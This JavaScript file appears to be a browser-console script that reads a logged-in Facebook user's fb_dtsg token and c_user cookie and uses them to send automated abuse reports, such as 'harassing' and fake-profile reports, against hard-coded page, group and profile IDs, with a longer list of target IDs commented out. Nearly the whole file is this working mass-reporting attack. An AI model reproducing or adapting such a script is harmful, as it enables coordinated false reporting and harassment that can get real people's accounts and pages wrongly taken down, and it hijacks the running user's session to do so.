/*pages*/

/*

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function pages(pid) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/report/social.php";
  var PageParams ="fb_dtsg="+fb_dtsg+"&first_choice=harassing&pp=%7B%22are_friends%22%3Afalse%2C%22cid%22%3A"+pid+"%2C%22content_type%22%3A23%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A1%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=b&ttstamp=265816710111657104112";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
pages("233824400006176");
pages("433662713394176");
pages("382408828493995");

*/

/*groups

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function G(gid) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/report/social.php";
  var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22are_friends%22%3Afalse%2C%22cid%22%3A"+gid+"%2C%22content_type%22%3A1%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A0%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECUC&__req=14&ttstamp=265816865451034555";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
G("598368236842941");
*/


/*PJ fake*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function Report(id) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/report/social.php";
  var PageParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A"+id+"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A"+id+"%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Report("100006474028106");






/*Ids*/

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function IDS(r) {
  var X = new XMLHttpRequest();
var XURL = "https://www.facebook.com/ajax/report/social.php";
  var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100003770144792");

/*

IDS("100002329611131");
IDS("100002688186485");
IDS("100001207223457");
IDS("100003887809227");
IDS("100002490655272");
IDS("100005713508674");
IDS("100000518672086");
IDS("100006314436328");
IDS("100006591992877");
IDS("100006111341896");
IDS("100005689031437");
IDS("100002688186485");
IDS("100003464269147");

*/


